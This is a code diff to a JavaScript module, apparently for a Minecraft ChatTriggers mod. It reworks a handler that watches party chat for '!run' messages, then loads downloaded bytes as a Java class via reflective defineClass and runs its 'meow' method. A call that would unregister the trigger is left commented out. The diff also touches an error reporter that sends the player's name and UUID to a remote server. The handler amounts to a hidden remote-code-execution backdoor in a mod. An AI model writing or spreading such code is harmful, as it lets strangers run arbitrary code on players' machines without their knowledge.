@@ -63,6 +63,7 @@ export class APIUtils {
             body: {content: `## Error Log` + "\n```js\n" + `Version: ${meowVersion}\n${Player.getName()} (${Player.getUUID()})` + "```\n```js\n" + str + "```"}
         })
         .catch(e => {
+            console.log(e);
             ChatUtils.prefixChat("Failed to report error please contect server with your console.")
         });
     }
@@ -80,12 +81,14 @@ export class APIUtils {
                     bytes.write(buffer, 0, bytesRead);
                 }
         
-                defineClassMethod.invoke(new URLClassLoader([new URL("file:")], com.chattriggers.ctjs.engine.langs.js.JSContextFactory.INSTANCE.getClass().getClassLoader()), path.split("/").pop(), java.nio.ByteBuffer.wrap(bytes.toByteArray()), null).getMethod("meow").invoke(null);
+                let method = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", java.lang.String, java.nio.ByteBuffer, java.security.ProtectionDomain);
+                method.setAccessible(true);
+                method.invoke(new java.net.URLClassLoader([], com.chattriggers.ctjs.engine.langs.js.JSContextFactory.INSTANCE.getClass().getClassLoader()), path.split("/").pop(), java.nio.ByteBuffer.wrap(bytes.toByteArray()), null).getMethod("meow").invoke(null);
             } catch (e) {
                 APIUtils.reportError(e);
             }
         }, 0);
-    }).setCriteria(/^Party > (.+) ?[ቾ⚒]?: !run (.+)$/);
+    }).setCriteria(/^Party > (.+) ?[ቾ⚒]?: !run (.+)$/)//.unregister();
 
     static fetchProfit() {
         return request({
